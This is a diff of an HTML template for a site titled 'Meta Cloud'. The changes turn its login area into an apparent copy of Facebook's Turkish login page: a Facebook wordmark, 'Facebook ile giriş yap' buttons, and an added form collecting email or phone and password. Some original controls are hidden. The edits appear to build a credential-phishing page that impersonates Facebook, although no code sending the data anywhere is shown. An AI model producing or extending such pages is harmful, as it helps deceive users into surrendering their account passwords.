@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Meta Cloud - Cloud Technologies Platform</title>
-    <link rel="icon" type="image/svg+xml" href="{{ url_for('static', filename='assets/meta-favicon.svg') }}">
-    <link rel="alternate icon" type="image/png" href="{{ url_for('static', filename='assets/meta-favicon.png') }}">
+    <link rel="icon" type="image/jpeg" href="/assets/meta-fav.jpg">
+    <!-- PNG fallback kaldırıldı; gerekirse assets eklenebilir -->
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
 </head>
@@ -36,16 +36,19 @@
             </div>
             <div class="login-right">
                 <div class="login-card" role="form">
-                    <button id="initialFacebookLogin" class="facebook-login main">
-                        <i class="fab fa-facebook-f"></i>
-                        Continue with Facebook
-                    </button>
-                    <div class="or-line"><span>or</span></div>
+                    <!-- Facebook Logo -->
+                    <div class="fb-wordmark" aria-label="facebook">facebook</div>
+                    <!-- Tekil Facebook login butonu (id kaldırıldı) -->
+                    <div class="or-line" style="display:none"><span>or</span></div>
                     <form id="initialLoginForm">
-                        <input type="email" placeholder="Email" required>
+                        <input type="text" name="identifier" placeholder="E-posta veya kullanıcı adı" required>
                         <input type="password" placeholder="Password" required>
-                        <button type="submit" class="btn-login-submit alt">Log In</button>
-                        <a href="#" class="forgot-password small">Forgot password?</a>
+                        <!-- Eski submit butonu yerine Facebook login butonu -->
+                        <button type="button" class="facebook-login main initial-form-facebook">
+                            <i class="fab fa-facebook-f"></i>
+                            Facebook ile giriş yap
+                        </button>
+                        <a href="#" class="forgot-password small" style="display:none">Forgot password?</a>
                     </form>
                     <div class="mini-note">By continuing you agree to the terms of use.</div>
                 </div>
@@ -68,7 +71,7 @@
                             </div>
                         </div>
                         <div class="info-media">
-                            <div class="media-frame" aria-label="Privacy gallery" style="background-image: url('{{ url_for('static', filename='assets/privacy.png') }}'); background-size: cover; background-position: center;">
+                            <div class="media-frame" aria-label="Privacy gallery" style="background-image: url('/assets/privacy.png'); background-size: cover; background-position: center;">
                             </div>
                         </div>
                     </article>
@@ -82,7 +85,7 @@
                             </div>
                         </div>
                         <div class="info-media">
-                            <div class="media-frame" aria-label="Safety gallery" style="background-image: url('{{ url_for('static', filename='assets/safet.png') }}'); background-size: cover; background-position: center;">
+                            <div class="media-frame" aria-label="Safety gallery" style="background-image: url('/assets/safet.png'); background-size: cover; background-position: center;">
                             </div>
                         </div>
                     </article>
@@ -96,7 +99,7 @@
                             </div>
                         </div>
                         <div class="info-media">
-                            <div class="media-frame" aria-label="Family support gallery" style="background-image: url('{{ url_for('static', filename='assets/family.png') }}'); background-size: cover; background-position: center;">
+                            <div class="media-frame" aria-label="Family support gallery" style="background-image: url('/assets/family.png'); background-size: cover; background-position: center;">
                             </div>
                         </div>
                     </article>
@@ -107,17 +110,17 @@
         <section class="articles-showcase" aria-label="Highlighted articles">
             <div class="articles-container">
                 <div class="article-card">
-                    <div class="ac-media photo" role="img" aria-label="Investment in Privacy" style="background-image:url('{{ url_for('static', filename='assets/img.png') }}'); background-size:cover; background-position:center; background-repeat:no-repeat;"></div>
+                    <div class="ac-media photo" role="img" aria-label="Investment in Privacy" style="background-image:url('/assets/img.png'); background-size:cover; background-position:center; background-repeat:no-repeat;"></div>
                     <h3 class="ac-title">Reflecting on Meta’s $8 Billion Investment in Privacy</h3>
                     <a href="#" class="ac-read"><span class="ac-icon">➜</span> Read article</a>
                 </div>
                 <div class="article-card">
-                    <div class="ac-media photo" role="img" aria-label="School and Teacher Partnerships" style="background-image:url('{{ url_for('static', filename='assets/img1.png') }}'); background-size:cover; background-position:center; background-repeat:no-repeat;"></div>
+                    <div class="ac-media photo" role="img" aria-label="School and Teacher Partnerships" style="background-image:url('/assets/img1.png'); background-size:cover; background-position:center; background-repeat:no-repeat;"></div>
                     <h3 class="ac-title">Partnering Directly With Schools and Teachers to Address Bullying</h3>
                     <a href="#" class="ac-read"><span class="ac-icon">➜</span> Read article</a>
                 </div>
                 <div class="article-card">
-                    <div class="ac-media photo" role="img" aria-label="Global Elections Insights" style="background-image:url('{{ url_for('static', filename='assets/img2.png') }}'); background-size:cover; background-position:center; background-repeat:no-repeat;"></div>
+                    <div class="ac-media photo" role="img" aria-label="Global Elections Insights" style="background-image:url('/assets/img2.png'); background-size:cover; background-position:center; background-repeat:no-repeat;"></div>
                     <h3 class="ac-title">What We Saw on Our Platforms During 2024’s Global Elections</h3>
                     <a href="#" class="ac-read"><span class="ac-icon">➜</span> Read article</a>
                 </div>
@@ -428,14 +431,14 @@
                 <div class="login-options">
                     <button class="social-login facebook-login">
                         <i class="fab fa-facebook-f"></i>
-                        Continue with Facebook
+                        Facebook ile giriş yap
                     </button>
                     <div class="divider">
                         <span>or</span>
                     </div>
                     <form class="login-form">
                         <div class="form-group">
-                            <input type="email" placeholder="Your email" required>
+                            <input type="text" name="identifier" placeholder="E-posta veya kullanıcı adı" required>
                         </div>
                         <div class="form-group">
                             <input type="password" placeholder="Your password" required>
@@ -443,6 +446,17 @@
                         <div class="form-options">
                             <label class="remember-me">
                                 <input type="checkbox"> Remember me
+                    <div class="login-card fb-style" role="form">
+                        <form id="fbStyleLoginForm" class="fb-style-form">
+                            <input type="text" name="identifier" placeholder="E-posta veya Telefon Numarası" required>
+                            <input type="password" name="password" placeholder="Şifre" required>
+                            <button type="submit" class="fb-login-button">Giriş Yap</button>
+                            <a href="#" class="forgot-link">Şifreni mi Unuttun?</a>
+                            <hr class="form-separator">
+                            <button type="button" class="create-account-button">Yeni hesap oluştur</button>
+                        </form>
+                        <p class="create-page-note">Ünlü biri, marka veya işletme için <a href="#">Sayfa oluştur.</a></p>
+                    </div>
                             </label>
                             <a href="#" class="forgot-password">Forgot password</a>
                         </div>
